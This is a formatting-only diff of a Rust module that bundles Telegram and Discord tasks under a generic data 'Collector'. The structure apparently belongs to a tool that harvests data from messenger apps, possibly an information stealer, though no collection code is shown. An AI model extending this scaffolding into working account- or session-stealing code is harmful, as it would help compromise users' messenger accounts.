@@ -3,26 +3,23 @@
 
 extern crate alloc;
 use crate::alloc::borrow::ToOwned;
-mod telegram;
 mod discord;
+mod telegram;
 
 use crate::discord::DiscordTask;
 use crate::telegram::TelegramTask;
 use alloc::vec;
 use collector::Collector;
-use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
+use tasks::{CompositeTask, Task, composite_task, impl_composite_task_runner};
 
 pub struct MessengersTask<C: Collector> {
-    inner: CompositeTask<C>
+    inner: CompositeTask<C>,
 }
 
 impl<C: Collector> Default for MessengersTask<C> {
     fn default() -> Self {
         Self {
-            inner: composite_task!(
-                TelegramTask,
-                DiscordTask
-            )
+            inner: composite_task!(TelegramTask, DiscordTask),
         }
     }
 }
